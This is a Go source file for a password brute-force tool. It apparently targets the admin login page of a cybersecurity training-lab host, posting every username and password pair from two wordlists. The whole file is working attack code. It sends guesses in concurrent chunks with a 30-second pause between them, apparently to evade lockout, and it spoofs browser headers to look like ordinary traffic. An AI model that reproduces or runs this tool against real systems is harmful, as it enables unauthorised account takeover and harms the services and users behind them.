package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"
	"strconv"
	"runtime"
	"log"
	"strings"
)

var (
	port          string
	threads       string
	usersFile     = "users.txt"
	passwordsFile = "passwords.txt"
)

func init() {
	if len(os.Args) <= 3 {
		fmt.Println("[INFO] Syntax: ./brute [ Port ] [ Threads ] [ Timeout ]")
		os.Exit(1)
	} else {
		threads = os.Args[2]
		port = os.Args[1]
	}
}

func main() {
	routinesCount, _ := strconv.Atoi(threads)
	runtime.GOMAXPROCS(routinesCount)

	var users []string
	var passwords []string
	var wg sync.WaitGroup

	// Read users
	lines, err := readLines(usersFile)
	if err != nil {
		log.Fatalf("readLines: %s", err)
	}
	for _, line := range lines {
		users = append(users, line)
	}

	// Read passwords
	lines2, err := readLines(passwordsFile)
	if err != nil {
		log.Fatalf("readLines: %s", err)
	}
	for _, line := range lines2 {
		passwords = append(passwords, line)
	}

	attempts := 0
	for i := 0; i < len(passwords); i += 5 {
	    for _, user := range users {
	        for j := i; j < i+5 && j < len(passwords); j++ {
	            pass := passwords[j]
	            wg.Add(1)
	            go func(u string, p string) {
	                defer wg.Done()
	                tryHost(u, "portal.cj23group.cyberjutsu-lab.tech", p)
	                attempts++
	                fmt.Printf("\rAttempt %d/%d", attempts, len(users)*len(passwords))
	            }(user, pass)
	        }
	    }
	    wg.Wait()
	    fmt.Printf("\nSleeping for 30 seconds before the next password chunk...\n")
	    time.Sleep(30 * time.Second)
	}

	fmt.Println("\nBrute force attempt completed.")
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	file.Close()
	return lines, scanner.Err()
}

func tryHost(user string, addr string, pass string) {
	client := &http.Client{}
	payload := fmt.Sprintf(`{"username":"%s","password":"%s"}`, user, pass)
	req, err := http.NewRequest("POST", "http://"+addr+"/admin/login", strings.NewReader(payload))
	if err != nil {
		return
	}

	req.Header.Set("Host", "portal.cj23group.cyberjutsu-lab.tech")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Origin", "http://portal.cj23group.cyberjutsu-lab.tech")
	req.Header.Set("Connection", "close")
	req.Header.Set("Referer", "http://portal.cj23group.cyberjutsu-lab.tech/admin/login")

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 { // Adjust this based on the actual server response
		fmt.Printf("\nPotential successful login -> %v with password -> %v", user, pass)
	}
}
